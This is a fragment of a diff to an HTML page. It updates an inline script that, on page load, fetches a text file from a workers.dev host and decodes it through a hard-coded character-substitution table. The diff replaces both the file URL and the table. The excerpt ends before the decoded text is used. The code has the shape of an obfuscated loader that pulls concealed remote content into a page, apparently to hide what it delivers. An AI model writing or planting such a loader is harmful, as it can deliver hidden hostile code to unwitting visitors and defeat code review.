@@ -30,7 +30,7 @@
 <div id="wait"></div>
 <script>
 (function () {
-  var at = "https://ash-queen-assets.danielpava01.workers.dev/Misc/8c75e371d0caceb6.txt?v=8c75e371d0caceb6", back = [112,72,58,103,109,71,70,40,77,104,69,123,42,78,33,44,88,105,116,74,47,96,111,57,82,113,67,98,106,54,119,121,122,101,94,46,64,45,48,38,107,118,34,51,75,89,53,62,50,36,60,68,93,114,85,43,80,32,56,126,41,84,61,66,117,73,35,65,100,110,108,76,91,102,86,55,95,92,97,120,90,39,87,99,125,79,59,37,52,83,81,63,115,49,124], wait = document.getElementById("wait");
+  var at = "https://ash-queen-assets.danielpava01.workers.dev/Misc/a9df6d723e976cec.txt?v=a9df6d723e976cec", back = [115,67,88,47,81,119,52,84,45,106,53,51,112,113,109,111,91,104,90,65,80,101,120,55,117,85,61,116,76,56,102,105,44,79,110,32,97,33,64,37,99,118,73,122,49,121,50,100,59,63,62,38,34,74,72,43,75,58,54,125,87,71,39,114,36,77,41,60,35,108,46,89,69,86,94,93,57,126,40,123,66,92,82,48,124,95,103,96,42,98,83,68,107,70,78], wait = document.getElementById("wait");
   fetch(at).then(function (r) { if (!r.ok) throw 0; return r.text(); }).then(function (t) {
     var out = new Array(t.length);
     for (var i = 0; i < t.length; i++) { var c = t.charCodeAt(i); out[i] = c >= 32 && c <= 126 ? String.fromCharCode(back[c - 32]) : t.charAt(i); }
